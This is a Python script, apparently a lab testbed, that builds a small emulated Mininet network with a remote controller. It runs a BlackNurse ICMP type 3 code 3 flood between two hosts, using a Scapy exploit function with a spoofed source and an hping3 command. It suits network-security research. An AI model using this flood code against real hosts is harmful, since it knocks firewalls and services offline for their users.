#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from os import geteuid
from sys import argv, exit

from mininet.net import Mininet
from mininet.topo import SingleSwitchTopo
from mininet.node import RemoteController
import time

def exploit(source, target, iface=None):
    # from https://github.com/opsxcq/exploit-blacknurse/blob/master/exploit.py
    """BlackNurse attack"""

    print("[*] Starting BlackNurse attack from " + source + " to " + target)
    socket = conf.L2socket(iface=(conf.iface if not iface else iface))
    packets = []
    # for i in xrange(1,100):
    for i in xrange(1,10):
        packets.append(IP(dst=target,src=source)/ICMP(type=3,code=3))

    while True:
        sendp(packets)
        time.sleep(20)
    # sendp(packets)


if __name__ == "__main__":

    if not geteuid() == 0:
        exit("[!] Must be run as sudo")

    nodes = 2
    print("[*] Starting single switch Mininet topology with %d nodes" % nodes)

    # topology = SingleSwitchTopo(k=nodes)
    # net = Mininet(topo=topology,controller=RemoteController)
    # c0 = net.addController('c0', port=6633)
    # h1, h2  = net.hosts[0], net.hosts[1]
    # c0.start()

    net = Mininet(controller=RemoteController)
    c0 = net.addController('c0', port=6633)
    s1 = net.addSwitch('s1', mac='00:00:00:00:00:21')

    h1 = net.addHost('h1', mac='00:00:00:00:00:01')
    h2 = net.addHost('h2', mac='00:00:00:00:00:02')
    
    # net.addLink(s1, h1)
    net.addLink(s1, h1)
    net.addLink(s1, h2)
    
    net.build()
    c0.start()
    s1.start([c0])

    # net.start()

    # help(h1)

    print("Hosts:")
    for h in net.hosts:
        print(str(h) + " - " + h.IP())
        # print h1.cmd('ping -c1 %s' % h.IP())

    try:
        # h1.cmd('hping3 -1 -C 3 -K 3 -i u10000 ' + h2.IP())
        h1.cmd('hping3 -1 -C 3 -K 3 -i u80 ' + h2.IP())
        # exploit(h2.IP(), h1.IP())
    # except IOError:
    #     exit("[!] Error sending packets")
    except KeyboardInterrupt:
        print("\n[*] Stopping BlackNurse attack")

    # print("\n[*] Waiting for timeouts to close mininet")
    # time.sleep(120)
    print("\n[*] Closing mininet")
    net.stop()
    